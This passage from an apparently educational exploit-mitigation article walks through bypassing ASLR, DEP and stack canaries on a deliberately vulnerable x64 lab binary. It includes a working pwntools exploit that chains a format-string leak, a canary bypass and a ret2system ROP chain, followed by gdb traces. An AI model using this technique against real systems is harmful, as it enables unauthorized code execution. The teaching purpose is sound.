0x00000000004006ca: test byte ptr [rax], al; add byte ptr [rax], al; add byte ptr [rax], al; pop rbp; ret; 
0x0000000000400759: int1; push rbp; mov rbp, rsp; call rax; 
0x00000000004007c2: leave; ret; 
0x00000000004005c1: ret; 

63 gadgets found

```

You can see that in our small binary over 60 unique gadgets are already present.  
Now all that's left is chaining the right ones together ;) .   
In our case this won't be as complicated, but depending on the binary you want to exploit this task can be a real hassle!

### The exploit

```python
#!/usr/bin/env python2

import argparse
from pwn import *
from pwnlib import *

context.binary = ELF('./binaries/vuln_x64')
context.log_level = 'DEBUG'

libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

pop_rdi_ret_gadget = 0x0000000000400903


def prepend_0x_to_hex_value(value):
    full_hex = '0x' + value
    return full_hex


def cast_hex_to_int(hex_value):
    return int(hex_value, 16)


def get_libc_base_address(leak_dump):
    random_libc_address = leak_dump.split('.')[1]
    random_libc_address_with_0x_prepended = prepend_0x_to_hex_value(random_libc_address)
    print '[*] leaked position within libc is at %s' % random_libc_address_with_0x_prepended
    libc_to_int = cast_hex_to_int(random_libc_address_with_0x_prepended)
    libc_base = hex(libc_to_int - 0x3c6790)                                             # offset found through debugging
    print "[=>] That puts the libc base address at %s" % libc_base
    return cast_hex_to_int(libc_base)


def get_canary_value(leak_dump):
    canary_address = leak_dump.split('.')[70]
    full_canary_value = prepend_0x_to_hex_value(canary_address)
    print '[+] Canary value is: %s' % full_canary_value
    canary_to_int = cast_hex_to_int(full_canary_value)
    return canary_to_int


def leak_all_the_things():
    payload = ''
    payload += '%llx.'*71
    return payload


def get_system_in_glibc(libc_base):
    print("[+] system@libc has offset: {}".format(hex(libc.symbols['system'])))
    system_call = libc_base + libc.symbols['system']
    print("[+] This puts the system call to {}".format(hex(system_call)))
    return system_call


def get_bin_sh_in_glibc(libc_base):
    bin_sh = int(libc.search("/bin/sh").next())
    print("[+] /bin/sh located @ offset {}".format(hex(bin_sh)))
    shell_addr = libc_base + bin_sh
    print("[+] This puts the shell to {}".format(hex(shell_addr)))
    return shell_addr


def get_cyclic_pattern(length):
    pattern = cyclic(length)
    return pattern


def create_payload(canary, system, shell):
    junk_pattern = get_cyclic_pattern(1032)
    payload = ''
    payload += junk_pattern					# junk pattern to fill buffer
    payload += p64(canary)					# place canary at the right position
    payload += 'AAAAAAAA'					# overwrite RBP with some junk
    payload += p64(pop_rdi_ret_gadget)		# overwrite RIP with the address of our ROP gadget 
    payload += p64(shell)					# pointer to /bin/sh in libc
    payload += p64(system)					# system@glibc
    return payload


def main():
    parser = argparse.ArgumentParser(description='pwnage')
    parser.add_argument('--dbg', '-d', action='store_true')
    args = parser.parse_args()

    exe = './binaries/vuln_x64'

    format_string_leak = leak_all_the_things()

    if args.dbg:
        r = gdb.debug([exe], gdbscript="""      
                b *trustMeIAmAnEngineer+56   
                continue
                """)
    else:
        r = process([exe])

    r.recvuntil("$> ")
    r.sendline(format_string_leak)

    leak = r.recvline()

    print '[+] Format string leak:\n [%s]\n' % leak.rsplit("\n")[0]

    libc_base = get_libc_base_address(leak)
    system_call = get_system_in_glibc(libc_base)
    bin_sh = get_bin_sh_in_glibc(libc_base)
    canary = get_canary_value(leak)

    payload = create_payload(canary, system_call, bin_sh)

    r.recvuntil("$> ")
    r.sendline(payload)

    r.interactive()


if __name__ == '__main__':
    main()
    sys.exit(0)

```

The exploit itself should be quite self explanatory, but let's quickly walk through it together.  
So first of all when launching the binary we wait for it to prompt us for the first input.  
When this happens we provide a bunch of format specifiers `%llx.` to get a leak from memory.  

> Recall: %llx. format string is a long long-sized integer

The leak will look something like this: 

	1.7f6c3501b790.a.0.7f6c35219700.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.7ffd002e786c.7f6c35019b78.7f6c3501b780.7f6c35244ca0.7f6c3501b780.1.ff000000000000.7f6c3501a620.0.7f6c3501a620.7f6c3501a6a4.7f6c3501a6a3.7ffdc2a905a0.7f6c34cd09e6.7f6c3501a620.0.0.7f6c34ccd439.7f6c3501a620.7f6c34cc4d94.0.5b9cf8225c7bc900.


It turned out that the 2nd leaked value is a random address within libc.  
Since we got that one we were able to calculate the base address of libc by looking up the libc mapping of the current process from within gdb.

```
gdb-peda$ vmmap
Start              End                Perm	Name
0x00400000         0x00401000         r-xp	/home/lab/Git/RE_binaries/0x00sec/ASLR/binaries/vuln_x64
0x00600000         0x00601000         r--p	/home/lab/Git/RE_binaries/0x00sec/ASLR/binaries/vuln_x64
0x00601000         0x00602000         rw-p	/home/lab/Git/RE_binaries/0x00sec/ASLR/binaries/vuln_x64
0x01d12000         0x01d33000         rw-p	[heap]
0x00007f6c34c55000 0x00007f6c34e15000 r-xp	/lib/x86_64-linux-gnu/libc-2.23.so
0x00007f6c34e15000 0x00007f6c35015000 ---p	/lib/x86_64-linux-gnu/libc-2.23.so
0x00007f6c35015000 0x00007f6c35019000 r--p	/lib/x86_64-linux-gnu/libc-2.23.so
0x00007f6c35019000 0x00007f6c3501b000 rw-p	/lib/x86_64-linux-gnu/libc-2.23.so
0x00007f6c3501b000 0x00007f6c3501f000 rw-p	mapped
0x00007f6c3501f000 0x00007f6c35045000 r-xp	/lib/x86_64-linux-gnu/ld-2.23.so
0x00007f6c35218000 0x00007f6c3521b000 rw-p	mapped
0x00007f6c35244000 0x00007f6c35245000 r--p	/lib/x86_64-linux-gnu/ld-2.23.so
0x00007f6c35245000 0x00007f6c35246000 rw-p	/lib/x86_64-linux-gnu/ld-2.23.so
0x00007f6c35246000 0x00007f6c35247000 rw-p	mapped
0x00007ffdc2a72000 0x00007ffdc2a93000 rw-p	[stack]
0x00007ffdc2a98000 0x00007ffdc2a9b000 r--p	[vvar]
0x00007ffdc2a9b000 0x00007ffdc2a9d000 r-xp	[vdso]
0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
gdb-peda$ 
```

We can see that the randomized base address for the used libc starts at `0x7f6c34c55000`.  
If we substract this value from the random libc leak we get the offset.  
This value marks the offset of the random libc address from the base address of libc.  
We can use exactly this offset value for any future execution to find our libc base address.  
This works, since we may have a fully randomized process memory and with that a randomized libc position in memory, but the offset of things within libraries is not changed and always has the same distance from the base address!
Hence calculating the randomized base address of libc with a static offset value is working 100% of the time.  
All of this base calculation happens in `get_libc_base_address(leak_dump)`.  


Having access to libc is like opening the box of the pandora.  
So much useful functions in there.  
I chose to go the `ret2system` way and calculated the address of `system()` and a pointer to `/bin/sh` from the libc base address.  
All of that happens in `get_system_in_glibc(libc_base)` and `get_bin_sh_in_glibc(libc_base)`.  

A really valuable information happened to be at the 71th position in the leaked data.  
We got our stack canary, which we need to successfully leverage a buffer overflow!  
This one is especially easy to spot since its a 16 bit value where the 2 least significant bits are both 0.  
I just extracted the value from the dump in `get_canary_value(leak_dump)`.  

All that is left now is putting it all together.  
This happens in `create_payload(canary, system, shell)`.  
I'm filling the buffer until right before it overflows in the stack canary.  
Then I'm appending the canary value and continue to overwrite the `RBP` with some junk, since it's irrelevant what we put here for the PoC.  
Afterwards our little friend the `pop rdi; ret` gadget is put onto the stack.  
Lastly a pointer to our wanted shell and the system call itself are added.  

Let's visualize this in gdb.  
Right when we hit the `ret` instruction in `trustMeIAmAnEngineer` after our buffer overflow happened our registers and stack look like this:

```
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7f6c34d4c260 (<__read_nocancel+7>:	cmp    rax,0xfffffffffffff001)
RDX: 0x800 
RSI: 0x7ffdc2a90090 ("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"...)
RDI: 0x0 
RBP: 0x4141414141414141 ('AAAAAAAA')
RSP: 0x7ffdc2a904a8 --> 0x400903 (<__libc_csu_init+99>:	pop    rdi)
RIP: 0x400812 (<trustMeIAmAnEngineer+78>:	ret)
R8 : 0x7f6c35219700 (0x00007f6c35219700)
R9 : 0x3 
R10: 0x37b 
R11: 0x246 
R12: 0x400670 (<_start>:	xor    ebp,ebp)
R13: 0x7ffdc2a905a0 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x40080a <trustMeIAmAnEngineer+70>:	je     0x400811 <trustMeIAmAnEngineer+77>
   0x40080c <trustMeIAmAnEngineer+72>:	call   0x400600 <__stack_chk_fail@plt>
   0x400811 <trustMeIAmAnEngineer+77>:	leave  
=> 0x400812 <trustMeIAmAnEngineer+78>:	ret    
   0x400813 <main>:	push   rbp
   0x400814 <main+1>:	mov    rbp,rsp
   0x400817 <main+4>:	sub    rsp,0x10
   0x40081b <main+8>:	mov    DWORD PTR [rbp-0x4],edi
[------------------------------------stack-------------------------------------]
0000| 0x7ffdc2a904a8 --> 0x400903 (<__libc_csu_init+99>:	pop    rdi)
0008| 0x7ffdc2a904b0 --> 0x7f6c34de1d57 --> 0x68732f6e69622f ('/bin/sh')
0016| 0x7ffdc2a904b8 --> 0x7f6c34c9a390 (<__libc_system>:	test   rdi,rdi)
0024| 0x7ffdc2a904c0 --> 0x40080a (<trustMeIAmAnEngineer+70>:	je     0x400811 <trustMeIAmAnEngineer+77>)
0032| 0x7ffdc2a904c8 --> 0x7f6c34c75830 (<__libc_start_main+240>:	mov    edi,eax)
0040| 0x7ffdc2a904d0 --> 0x0 
0048| 0x7ffdc2a904d8 --> 0x7ffdc2a905a8 --> 0x7ffdc2a92109 ("./binaries/vuln_x64")
0056| 0x7ffdc2a904e0 --> 0x135244ca0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
gdb-peda$ 
```

We can see that all of our final payload is located on the stack.  
When executing the `ret` instruction the next value on the stack is popped and put into `RIP`.  
This will be our `pop rdi; ret` gadget.  
The top of the stack, the `RSP`, is changed accordingly to point to the next value on the stack, which is the pointer to our shell `/bin/sh` as well.  

```
[----------------------------------registers-----------------------------------]
[...]
RBP: 0x4141414141414141 ('AAAAAAAA')
RSP: 0x7ffdc2a904b0 --> 0x7f6c34de1d57 --> 0x68732f6e69622f ('/bin/sh')
RIP: 0x400903 (<__libc_csu_init+99>:	pop    rdi)
[...]
[-------------------------------------code-------------------------------------]
=> 0x400903 <__libc_csu_init+99>:	pop    rdi
   0x400904 <__libc_csu_init+100>:	ret    
   0x400905:	nop
   0x400906:	nop    WORD PTR cs:[rax+rax*1+0x0]
[------------------------------------stack-------------------------------------]
0000| 0x7ffdc2a904b0 --> 0x7f6c34de1d57 --> 0x68732f6e69622f ('/bin/sh')
0008| 0x7ffdc2a904b8 --> 0x7f6c34c9a390 (<__libc_system>:	test   rdi,rdi)
0016| 0x7ffdc2a904c0 --> 0x40080a (<trustMeIAmAnEngineer+70>:	je     0x400811 <trustMeIAmAnEngineer+77>)
0024| 0x7ffdc2a904c8 --> 0x7f6c34c75830 (<__libc_start_main+240>:	mov    edi,eax)
0032| 0x7ffdc2a904d0 --> 0x0 
0040| 0x7ffdc2a904d8 --> 0x7ffdc2a905a8 --> 0x7ffdc2a92109 ("./binaries/vuln_x64")
0048| 0x7ffdc2a904e0 --> 0x135244ca0 
0056| 0x7ffdc2a904e8 --> 0x400813 (<main>:	push   rbp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
gdb-peda$ 
```


Let's execute `pop rdi; ret` now, which will put the current top of the stack into `RDI`, which is our shell pointer.  
Since our chosen gadget ends with a `ret` statment it's next in the execution flow.  
It will continue execution with the next instruction `RSP` points to, which is our `system()` call!


```
[----------------------------------registers-----------------------------------]
[...]
RDI: 0x7f6c34de1d57 --> 0x68732f6e69622f ('/bin/sh')
RBP: 0x4141414141414141 ('AAAAAAAA')
RSP: 0x7ffdc2a904b8 --> 0x7f6c34c9a390 (<__libc_system>:	test   rdi,rdi)
RIP: 0x400904 (<__libc_csu_init+100>:	ret)
[...]
[-------------------------------------code-------------------------------------]
   0x4008fe <__libc_csu_init+94>:	pop    r13
   0x400900 <__libc_csu_init+96>:	pop    r14
   0x400902 <__libc_csu_init+98>:	pop    r15
=> 0x400904 <__libc_csu_init+100>:	ret    
   0x400905:	nop
   0x400906:	nop    WORD PTR cs:[rax+rax*1+0x0]
   0x400910 <__libc_csu_fini>:	repz ret 
   0x400912:	add    BYTE PTR [rax],al
[------------------------------------stack-------------------------------------]
0000| 0x7ffdc2a904b8 --> 0x7f6c34c9a390 (<__libc_system>:	test   rdi,rdi)
0008| 0x7ffdc2a904c0 --> 0x40080a (<trustMeIAmAnEngineer+70>:	je     0x400811 <trustMeIAmAnEngineer+77>)
0016| 0x7ffdc2a904c8 --> 0x7f6c34c75830 (<__libc_start_main+240>:	mov    edi,eax)
0024| 0x7ffdc2a904d0 --> 0x0 
0032| 0x7ffdc2a904d8 --> 0x7ffdc2a905a8 --> 0x7ffdc2a92109 ("./binaries/vuln_x64")
0040| 0x7ffdc2a904e0 --> 0x135244ca0 
0048| 0x7ffdc2a904e8 --> 0x400813 (<main>:	push   rbp)
0056| 0x7ffdc2a904f0 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
gdb-peda$ 
```

Remember what I introduced in the x64 exploitation crash course?  
The first function argument on x64 *needs* to be put in `RDI`.  
We managed to place our pointer to `/bin/sh` there.  
And that's all actually!  
Next `system()` is called with the contents of `RDI` as a function argument that gets us a shell.  

> Alternative PoC: vmmap reveals that our stack ends at 0x00007ffdc2a93000 the 62th value in the leak is within the stack frame (0x7ffdc2a905a0). We  could leverage this to call `mprotect()` on the stack to make him executable again too!

### PoC


https://asciinema.org/a/BaC2iCKPl4xSDSAjTvEO8QsNQ

![PoC](https://github.com/0x00rick/articles/images/poc.png)

----
## Conclusion

Address space layout randomization and position independent executables fully randomize the adress space of any executed binary and were implemented not just as another "final defense against attack X" mechanism, but to make exploiting in general a lot more difficult.  
The introduced randomness breaks any of the *static* exploit approaches taken before and made the game a lot more difficult.  

But the found design flaws especially on 32 bit operating systems reduce the viability of this technique by quite a lot.  
Luckily the era of 32 bit OSes comes to an end nowadays, at least in the desktop and server area, IoT is another topic :) ...  

The showed PoC introduced x64 exploitation as well as showed how a possible bypass against an ASLR, DEP and stack canary hardened binary *can* look like.  
The used vulnerabilities were more than obvious and real life exploitation is (most often) a lot more difficult, but I think the general idea was conveyed in an easy to digest manner.  
At best you have an awesome memory leak, which gets you sone libc address and maybe even the canary.  
If RELRO is not fully enabled and we have a viable format string vulnerability at hand we can try to overwrite the entries within the GOT.  
PIE makes building ROP chains quite a bit more complex and was left out for the sake of understandability.  
  

Last but not least I hope you enjoyed the reading and as always I would appreciate your feedback to make future articles better!


-ricksanchez

---

## Sources

### Previous articles

* [Data Execution Prevention](https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/) 
* [Stack Canaries](https://0x00sec.org/t/exploit-mitigation-techniques-stack-canaries/) 


### References

* [Differences Between ASLR on Windows and Linux](https://insights.sei.cmu.edu/cert/2014/02/differences-between-aslr-on-windows-and-linux.html)
* [Position Independent Executables (PIE)](https://access.redhat.com/blogs/766093/posts/1975793)
* [Breaking Kernel Address Space Layout Randomization with Intel TSX](https://www.blackhat.com/docs/us-16/materials/us-16-Jang-Breaking-Kernel-Address-Space-Layout-Randomization-KASLR-With-Intel-TSX-wp.pdf)
* [ASLR support for Linux](https://kernelnewbies.org/Linux_2_6_12)
* [kernel ASLR (kASLR) support for Linux](https://kernelnewbies.org/Linux_3.14)
* [Exploiting Linux and PaX ASLR’s weaknesses on 32- and 64-bit systems](https://www.blackhat.com/docs/asia-16/materials/asia-16-Marco-Gisbert-Exploiting-Linux-And-PaX-ASLRS-Weaknesses-On-32-And-64-Bit-Systems-wp.pdf)
* [Address Space Layout Randomization by PAX](https://pax.grsecurity.net/docs/aslr.txt)
* [Offset2lib: bypassing full ASLR on 64bit Linux](http://cybersecurity.upv.es/attacks/offset2lib/offset2lib.html)
* [Surgically returning to randomized lib(c)](http://security.di.unimi.it/~gianz/pubs/acsac09-lecture.pdf)
* [Linux Kernel on Git](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/)
* [Derandomizing Kernel Address Space Layout for Memory Introspection and Forensics](https://dl.acm.org/citation.cfm?id=2857705.2857707)
* [Practical Timing Side Channel Attacks against Kernel Space ASLR](https://dl.acm.org/citation.cfm?id=2498111)
* [Just-In-Time Code Reuse: On the Effectiveness of Fine-Grained Address Space Layout Randomization](http://www.ieee-security.org/TC/SP2013/papers/4977a574.pdf)
* [On the Effectiveness of Address-Space Randomization](https://web.stanford.edu/~blp/papers/asrandom.pdf)

**New ASLR bypass presented in March 2018** 

* [RETURN-TO-CSU: A NEW METHOD TO BYPASS 64-BIT LINUX ASLR](https://www.blackhat.com/asia-18/briefings/schedule/index.html#return-to-csu-a-new-method-to-bypass-64-bit-linux-aslr-9485)

### Misc Reads

* [Windows 8 and later fail to properly randomize every application if system-wide mandatory ASLR is enabled via EMET or Windows Defender Exploit Guard](https://www.kb.cert.org/vuls/id/817544)
* [AMD Bulldozer Linux ASLR weakness: Reducing entropy by 87.5%](http://hmarco.org/bugs/AMD-Bulldozer-linux-ASLR-weakness-reducing-mmaped-files-by-eight.html)
